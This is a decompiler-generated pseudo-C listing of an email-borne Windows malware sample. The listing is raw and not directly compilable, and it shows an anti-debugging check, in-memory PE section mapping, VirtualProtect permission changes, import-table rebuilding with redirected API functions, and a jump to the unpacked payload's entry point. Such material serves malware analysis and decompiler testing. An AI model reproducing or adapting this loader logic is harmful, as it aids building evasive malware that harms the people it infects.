// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0989/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

word32 fn003E1000(ptr32 ebpOut)
{
	Mem18[fp - 0x00000010:word32] = Mem0[fp + 0x00000000:word32];
	Mem23[fp - 0x0000000C:word32] = Mem18[fp - 0x00000010:word32] + Mem18[Mem18[fp - 0x00000010:word32] + 0x0000003C:word32];
	word32 ebp_26;
	*ebpOut = Mem23[fp - 0x00000008:word32];
	return Mem23[fp - 0x0000000C:word32];
}

void fn003E101D(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 ebp_19 = fn003E1A03(dwLoc18, dwArg08, dwArg04);
	Mem24[fp - 0x0000000C:word32] = ebp_19 - 0x00000004;
	Mem26[fp - 0x00000010:word32] = 0x00000002;
	Mem28[fp - 0x00000014:word32] = Mem26[ebp_19 + 0x00000010:word32];
	Mem30[fp - 0x00000018:word32] = Mem28[ebp_19 + 0x0000000C:word32];
	VirtualProtect(Mem30[fp - 0x00000018:LPVOID], Mem30[fp - 20:SIZE_T], Mem30[fp - 16:DWORD], Mem30[fp - 12:PDWORD]);
	return;
}

word32 fn003E10AF(word32 ecx, word32 dwArg04, word32 dwArg08)
{
	word32 eax_35;
	word32 eax_15 = GetProcAddress(dwArg04, dwArg08);
	if (fn003E1A71(ecx, dwArg08, 0x003E2050) == 0x00000000)
	{
		Mem40[0x003EAA10:word32] = eax_15;
		Mem42[fp - 0x0000000C:word32] = 0x003E1050;
		eax_35 = 0x003E2050;
	}
	else
	{
		Mem46[fp - 0x0000000C:word32] = 0x003E2064;
		if (fn003E1A71(0x003E2050, dwArg08, 0x003E2050) == 0x00000000)
		{
			Mem58[0x003EAA14:word32] = eax_15;
			Mem60[fp - 0x0000000C:word32] = 0x003E1080;
			eax_35 = 0x003E2064;
		}
		else
		{
			Mem64[fp - 0x0000000C:word32] = eax_15;
			eax_35 = 0x003E2064;
		}
	}
	return eax_35;
}

byte fn003E110E(word32 dwArg04)
{
	return (byte) -(0x00000000 - (-(dwArg04 & 0x80000000) == 0x00000000));
}

word32 fn003E1121(word32 dwArg04)
{
	Mem14[0x003EAA18:word32] = GetModuleHandleA(0x00000000);
	Mem19[0x003EAA1C:word32] = Mem14[fp + 0x00000004:word32];
	Mem25[fp - 0x00000010:word32] = Mem19[fp + 0x00000000:word32] + 0x00000080;
	Mem30[fp - 0x0000000C:word32] = Mem25[fp + 0x00000004:word32] + Mem25[Mem25[fp - 0x00000010:word32]:word32];
	while (Mem30[dwLoc0C + 0x0000000C:word32] != 0x00000000)
	{
		word32 dwLoc14_104;
		word32 eax_77 = LoadLibraryA(dwArg04 + Mem30[dwLoc0C + 0x0000000C:word32]);
		if (Mem30[dwLoc0C + 0x00000004:word32] == 0x00000000)
			dwLoc14_104 = dwArg04 + Mem30[dwLoc0C + 0x00000010:word32];
		else
			dwLoc14_104 = dwArg04 + Mem30[dwLoc0C + 0x00000000:word32];
		word32 dwLoc1C_103 = dwArg04 + Mem30[dwLoc0C + 0x00000010:word32];
		while (Mem30[dwLoc14_104 + 0x00000000:word32] != 0x00000000)
		{
			word32 dwLoc18_130;
			if ((word32) fn003E110E(Mem30[dwLoc14_104 + 0x00000000:word32]) != 0x00000000)
				dwLoc18_130 = GetProcAddress(eax_77, (word32) (word16) (Mem30[dwLoc14_104 + 0x00000000:word32] & 0x0000FFFF));
			else
			{
				word32 ecx_167 = dwArg04 + Mem30[dwLoc14_104 + 0x00000000:word32];
				dwLoc18_130 = fn003E10AF(ecx_167, eax_77, ecx_167 + 0x00000002);
			}
			Mem139[dwLoc1C_103 + 0x00000000:word32] = dwLoc18_130;
			dwLoc1C_103 = dwLoc1C_103 + 0x00000004;
			dwLoc14_104 = dwLoc14_104 + 0x00000004;
		}
		dwLoc0C = dwLoc0C + 0x00000014;
	}
	return fp - 0x00000008;
}

void fn003E1250(word32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	do
	{
		Mem16[fp - 0x0000000C:word32] = 0x00000000;
		if (ReadFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00000000), fp - 0x00000008, 0x00000000) == 0x00000000)
			goto l003E1284;
	} while ((ecx & 0x00000000) != dwArg0C);
l003E1284:
	return;
}

word32 fn003E1286(word32 dwArg00, word32 dwArg04, word32 dwArg08)
{
	Mem14[fp - 0x0000000C:word32] = Mem0[fp - 0x0000000C:word32] & 0x00000000;
	do
		if (WriteFile(dwArg00, dwArg04, dwArg08, fp - 0x0000000C, 0x00000000) == 0x00000000)
			goto l003E12BB;
	while (0x00000000 != dwArg08);
l003E12BB:
	return ecx;
}

word32 fn003E12BD(word32 ebp)
{
	Mem14[fp - 0x0000000C:word32] = Mem0[fp - 0x0000000C:word32] & 0x00000000;
	word32 ebp_17 = fp - 0x00000008;
	word32 esp_19 = fp - 0x00000008;
	word32 esp_21 = esp_19 - 0x00000004;
	Mem22[esp_21 + 0x00000000:word32] = Mem14[ebp_17 - 0x00000004:word32];
	while (Mem22[esp_21 + 0x00000000:word32] <u Mem22[ebp_17 + 0x00000010:word32])
	{
		Mem28[esp_21 + 0x00000000:word32] = 0x00000008;
		Mem30[esp_21 - 0x00000004:word32] = Mem28[ebp_17 - 0x00000004:word32];
		Mem36[esp_21 - 0x00000004:word32] = Mem30[ebp_17 + 0x0000000C:word32] + Mem30[esp_21 - 0x00000004:word32] * 0x00000004;
		Mem38[esp_21 - 0x00000008:word32] = Mem36[ebp_17 + 0x00000008:word32];
		Mem42[esp_21 - 0x00000008:word32] = Mem38[Mem38[esp_21 - 0x00000008:word32] + 0x00000004:word32];
		ebp_17 = fn003E1286(ebp, dwArg00, dwArg04);
		Mem49[esp_21 + 0x00000000:word32] = 0x00000008;
		word32 ecx_51 = Mem49[ebp_17 + 0x0000000C:word32];
		Mem54[esp_21 - 0x00000004:word32] = ecx_51 + Mem49[ebp_17 - 0x00000004:word32] * 0x00000004;
		Mem56[esp_21 - 0x00000008:word32] = Mem54[ebp_17 + 0x00000008:word32];
		Mem60[esp_21 - 0x00000008:word32] = Mem56[Mem56[esp_21 - 0x00000008:word32]:word32];
		fn003E1250(ecx_51, dwArg00, dwArg04, dwArg08);
		Mem65[esp_21 + 0x00000000:word32] = Mem60[ebp_17 - 0x00000004:word32];
		Mem71[ebp_17 - 0x00000004:word32] = Mem65[esp_21 + 0x00000000:word32] + 0x00000002;
		esp_19 = esp_21 + 0x00000004;
		esp_21 = esp_19 - 0x00000004;
		Mem22[esp_21 + 0x00000000:word32] = Mem14[ebp_17 - 0x00000004:word32];
	}
	return Mem22[ebp_17 + 0x00000000:word32];
}

void fn003E1400()
{
	CloseHandle(Mem0[Mem0[fp + 0x00000000:word32]:word32]);
	CloseHandle(Mem0[Mem0[fp + 0x00000000:word32] + 0x00000004:word32]);
	return;
}

word32 fn003E141D(word32 ebp, selector fs)
{
	word32 eax_114;
	if ((word32) Mem0[Mem0[fn003E1620(fs) + 0x00000030:word32] + 0x00000002:byte] != 0x00000000)
		eax_114 = 0x00000000;
	else
	{
		Mem73[0x00413E1D:word32] = 0x00000053;
		word32 v9_74 = Mem73[0x00413E1D:word32] + 0x00001258;
		Mem75[0x00413E1D:word32] = v9_74;
		Mem76[0x00413E21:word32] = 0x00001454;
		Mem77[0x00413E25:word32] = 0x00007407;
		Mem78[0x00413E29:word32] = 0x00000ABE;
		word32 v10_79 = Mem78[0x00413E29:word32] + 0x00002A56;
		Mem80[0x00413E29:word32] = v10_79;
		if (CreatePipe(fp - 0x00000044, fp - 0x00000034, 0x00000000, 0x00000010) == 0x00000000)
			eax_114 = 0x00000000;
		else
		{
			Mem100[fp - 0x00000058:word32] = 0x00000010;
			Mem102[fp - 0x0000005C:word32] = 0x00000000;
			if (CreatePipe(fp - 0x00000038, fp - 0x00000040, 0x00000000, 0x00000010) == 0x00000000)
				eax_114 = 0x00000000;
			else
			{
				Mem119[fp - 0x00000058:word32] = fp - 0x0000002C;
				Mem121[fp - 0x0000005C:word32] = 0x00000000;
				CreateThread(0x00000000, 0x00000000, 0x003E1313, fp - 0x00000044, 0x00000000, 0x00000010);
				Mem154[fp - 0x00000058:word32] = 0x00000008;
				Mem157[fp - 0x0000005C:word32] = fp - 0x00000024;
				word32 ebp_161 = fn003E12BD(fp - 0x00000004);
				Mem164[fp - 0x00000058:word32] = Mem157[0x003EAA0B:word32];
				Mem170[fp - 0x00000058:word32] = Mem164[fp - 0x00000058:word32] >>u 0x00000002;
				Mem172[fp - 0x0000005C:word32] = 0x003E3000;
				Mem175[fp - 0x00000060:word32] = ebp_161 - 0x00000034;
				word32 ebp_176 = fn003E12BD(ebp_161);
				Mem181[fp - 0x00000058:word32] = ebp_176 - 0x00000034;
				fn003E1400();
				Mem186[fp - 0x00000058:word32] = ebp_176 - 0x00000040;
				fn003E1400();
				Mem190[fp - 0x00000058:word32] = Mem186[ebp_176 - 0x00000044:word32];
				CloseHandle(Mem190[fp - 0x00000058:HANDLE]);
				Mem194[fp - 0x00000058:word32] = 0x003E3000;
				word32 ebp_195;
				word32 eax_196 = fn003E1000(out ebp_195);
				Mem199[ebp_195 - 0x0000002C:word32] = eax_196;
				if (Mem199[ebp_195 - 0x0000002C:word32] != 0x00000000)
				{
					Mem212[fp - 0x00000058:word32] = Mem199[ebp_195 - 0x0000002C:word32];
					Mem216[fp - 0x00000058:word32] = Mem212[Mem212[fp - 0x00000058:word32] + 0x00000034:word32];
					Mem219[ebp_195 - 0x0000004C:word32] = Mem216[fp - 0x00000058:word32];
					Mem222[fp - 0x00000058:word32] = Mem219[Mem219[ebp_195 - 0x0000002C:word32] + 0x00000054:word32];
					Mem224[fp - 0x0000005C:word32] = Mem222[ebp_195 - 0x0000004C:word32];
					Mem226[fp - 0x00000060:word32] = 0x003E3000;
					fn003E101D(dwArg00, dwArg04, dwArg08);
					Mem233[fp - 0x00000058:word32] = Mem226[ebp_195 - 0x0000004C:word32];
					Mem235[fp - 0x0000005C:word32] = 0x003E3000;
					Mem237[fp - 0x00000060:word32] = Mem235[ebp_195 - 0x0000002C:word32];
					fn003E1630(ebp_195, dwArg00);
					Mem241[fp - 0x00000058:word32] = Mem237[ebp_195 - 0x0000004C:word32];
					word32 ebp_242;
					word32 eax_243 = fn003E1000(out ebp_242);
					Mem246[ebp_242 - 0x00000048:word32] = eax_243;
					if (Mem246[ebp_242 - 0x00000048:word32] != 0x00000000)
					{
						Mem250[fp - 0x00000058:word32] = Mem246[ebp_242 - 0x0000004C:word32];
						Mem252[fp - 0x0000005C:word32] = Mem250[ebp_242 - 0x00000048:word32];
						word32 ebp_253 = fn003E1121(dwArg00);
						Mem259[fp - 0x00000058:word32] = Mem252[ebp_253 - 0x0000004C:word32];
						Mem261[fp - 0x0000005C:word32] = Mem259[ebp_253 - 0x00000048:word32];
						word32 ebp_262 = fn003E17C2(dwArg00);
						Mem269[Mem261[ebp_262 - 0x00000038:word32] + 0x00000008:word32] = Mem261[ebp_262 - 0x0000004C:word32];
						Mem271[fp - 0x00000058:word32] = Mem269[ebp_262 - 0x0000002C:word32];
						word32 eax_272 = Mem271[fp - 0x00000058:word32];
						Mem275[fp - 0x00000058:word32] = Mem271[ebp_262 - 0x0000004C:word32];
						word32 ecx_278 = Mem275[fp - 0x00000058:word32] + Mem275[eax_272 + 0x00000028:word32];
						Mem280[ebp_262 - 0x00000050:word32] = ecx_278;
						Mem280[ebp_262 - 0x00000050:word32]();
					}
				}
				eax_114 = 0x00000000;
			}
		}
	}
	return eax_114;
}

void fn003E1604(selector fs)
{
	Mem14[fp - 0x0000000C:word32] = fn003E141D(fp - 0x00000008, fs);
	Mem16[fp - 0x0000000C:word32] = Mem14[fp - 0x0000000C:word32];
	ExitProcess(Mem16[fp - 0x0000000C:UINT]);
	return;
}

word32 fn003E1620(selector fs)
{
	return Mem0[fs:0x00000018:word32];
}

void fn003E1630(word32 ebp, word32 dwArg04)
{
	word32 ebp_34 = fp - 0x00000004;
	word32 esp_24 = fp - 0x0000002C;
	while ((word32) Mem0[ebp_34 - 0x00000010:word16] < (word32) Mem0[ebp_34 - 0x00000008:word16])
	{
		word32 eax_41 = (word32) Mem0[ebp_34 - 0x00000010:word16];
		word32 esp_43 = esp_24 - 0x00000004;
		Mem44[esp_43 + 0x00000000:word32] = Mem0[ebp_34 - 0x00000004:word32];
		Mem48[esp_43 + 0x00000000:word32] = Mem44[eax_41 *s 0x00000028 + 0x00000008 + Mem44[esp_43 + 0x00000000:word32]:word32];
		Mem51[ebp_34 - 0x00000024:word32] = Mem48[esp_43 + 0x00000000:word32];
		Mem56[esp_43 + 0x00000000:word32] = Mem51[(word32) Mem51[ebp_34 - 0x00000010:word16] *s 0x00000028 + 0x00000010 + Mem51[ebp_34 - 0x00000004:word32]:word32];
		Mem59[ebp_34 - 0x00000014:word32] = Mem56[esp_43 + 0x00000000:word32];
		word32 esp_105 = esp_43 + 0x00000004;
		if (Mem59[ebp_34 - 0x00000024:word32] <u Mem59[ebp_34 - 0x00000014:word32])
		{
			Mem103[esp_43 + 0x00000000:word32] = Mem59[ebp_34 - 0x00000024:word32];
			Mem106[ebp_34 - 0x00000028:word32] = Mem103[esp_43 + 0x00000000:word32];
			esp_105 = esp_43 + 0x00000004;
		}
		else
			Mem108[ebp_34 - 0x00000028:word32] = Mem59[ebp_34 - 0x00000014:word32];
		word32 esp_64 = esp_105 - 0x00000004;
		Mem65[esp_64 + 0x00000000:word32] = Mem59[ebp_34 - 0x00000028:word32];
		Mem68[ebp_34 - 0x00000018:word32] = Mem65[esp_64 + 0x00000000:word32];
		word32 eax_69 = (word32) Mem68[ebp_34 - 0x00000010:word16];
		Mem72[esp_64 + 0x00000000:word32] = Mem68[ebp_34 - 0x00000004:word32];
		Mem77[ebp_34 - 0x0000001C:word32] = Mem72[ebp_34 + 0x00000010:word32] + Mem72[(eax_69 *s 0x00000028 + 0x0000000C) + Mem72[esp_64 + 0x00000000:word32]:word32];
		word32 eax_78 = (word32) Mem77[ebp_34 - 0x00000010:word16];
		Mem81[esp_64 + 0x00000000:word32] = Mem77[ebp_34 - 0x00000004:word32];
		Mem87[ebp_34 - 0x00000020:word32] = Mem81[ebp_34 + 0x0000000C:word32] + Mem81[(eax_78 *s 0x00000028 + 0x00000014) + Mem81[esp_64 + 0x00000000:word32]:word32];
		Mem89[esp_64 + 0x00000000:word32] = Mem87[ebp_34 - 0x00000018:word32];
		Mem91[esp_64 - 0x00000004:word32] = Mem89[ebp_34 - 0x00000020:word32];
		Mem93[esp_64 - 0x00000008:word32] = Mem91[ebp_34 - 0x0000001C:word32];
		ebp_34 = fn003E1A03(ebp, dwArg00, dwArg04);
		esp_24 = esp_64 + 0x00000004;
		Mem101[ebp_34 - 0x00000010:word16] = Mem93[ebp_34 - 0x00000010:word16] + 0x0001;
	}
	return;
}

word32 fn003E16FD(word32 ecx, word32 dwArg04)
{
	word32 dwLoc08_10 = ecx & 0x00000000;
	if ((dwArg04 & 0x04000000) != 0x00000000)
		dwLoc08_10 = ecx & 0x00000000 | 0x00000200;
	word32 dwLoc08_101;
	if ((dwArg04 & 0x20000000) == 0x00000000)
		if ((dwArg04 & 0x40000000) == 0x00000000)
			if ((dwArg04 & 0x80000000) != 0x00000000)
				dwLoc08_101 = dwLoc08_10 | 0x00000008;
			else
				dwLoc08_101 = dwLoc08_10 | 0x00000001;
		else if ((dwArg04 & 0x80000000) != 0x00000000)
			dwLoc08_101 = dwLoc08_10 | 0x00000004;
		else
			dwLoc08_101 = dwLoc08_10 | 0x00000002;
	else if ((dwArg04 & 0x40000000) == 0x00000000)
		if ((dwArg04 & 0x80000000) != 0x00000000)
			dwLoc08_101 = dwLoc08_10 | 0x00000080;
		else
			dwLoc08_101 = dwLoc08_10 | 0x00000010;
	else if ((dwArg04 & 0x80000000) != 0x00000000)
		dwLoc08_101 = dwLoc08_10 | 0x00000040;
	else
		dwLoc08_101 = dwLoc08_10 | 0x00000020;
	return dwLoc08_101;
}

word32 fn003E17C2(word32 dwArg04)
{
	Mem16[fp - 0x00000014:word32] = Mem0[fp + 0x00000000:word32] + 0x000000F8;
	Mem19[fp - 0x00000010:word16] = Mem16[Mem16[fp + 0x00000000:word32] + 0x00000006:word16];
	Mem21[fp - 0x0000000C:word32] = Mem19[fp - 0x00000014:word32];
	Mem23[fp - 0x00000018:word16] = Mem21[fp - 0x00000018:word16] & 0x0000;
	while ((word32) wLoc18 < (word32) wLoc10)
	{
		VirtualProtect(dwArg04 + Mem23[((word32) wLoc18 *s 0x00000028 + 0x0000000C) + dwLoc0C:word32], fp - 0x0000001C, fn003E16FD(dwLoc0C, Mem23[(word32) wLoc18 *s 0x00000028 + 0x00000024 + dwLoc0C:word32]), fp - 0x0000001C);
		wLoc18 = wLoc18 + 0x0001;
	}
	return fp - 0x00000008;
}

word32 fn003E1A03(word32 dwArg00, word32 dwArg04, word32 dwArg08)
{
	Mem17[fp - 0x0000000C:word32] = Mem0[fp + 0x00000000:word32];
	dwArg08 = dwArg08 - 0x00000001;
	while (dwArg08 != 0x00000000)
	{
		Mem45[dwArg00 + 0x00000000:byte] = Mem17[dwArg04 + 0x00000000:byte];
		dwArg00 = dwArg00 + 0x00000001;
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08 = dwArg08 - 0x00000001;
	}
	return ecx;
}

word32 fn003E1A71(word32 ecx, word32 dwArg04, word32 dwArg08)
{
	word32 eax_30 = (word32) Mem0[dwArg04 + 0x00000000:byte] - (word32) Mem0[dwArg08 + 0x00000000:byte];
	word32 dwLoc08_33 = eax_30;
	while (eax_30 == 0x00000000 && (int32) Mem0[dwArg08 + 0x00000000:byte] != 0x00000000)
	{
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08 = dwArg08 + 0x00000001;
		eax_30 = (word32) Mem0[dwArg04 + 0x00000000:byte] - (word32) Mem0[dwArg08 + 0x00000000:byte];
		dwLoc08_33 = eax_30;
	}
	if (eax_30 < 0x00000000)
		dwLoc08_33 = eax_30 | 0xFFFFFFFF;
	else if (eax_30 > 0x00000000)
		dwLoc08_33 = 0x00000001;
	return dwLoc08_33;
}

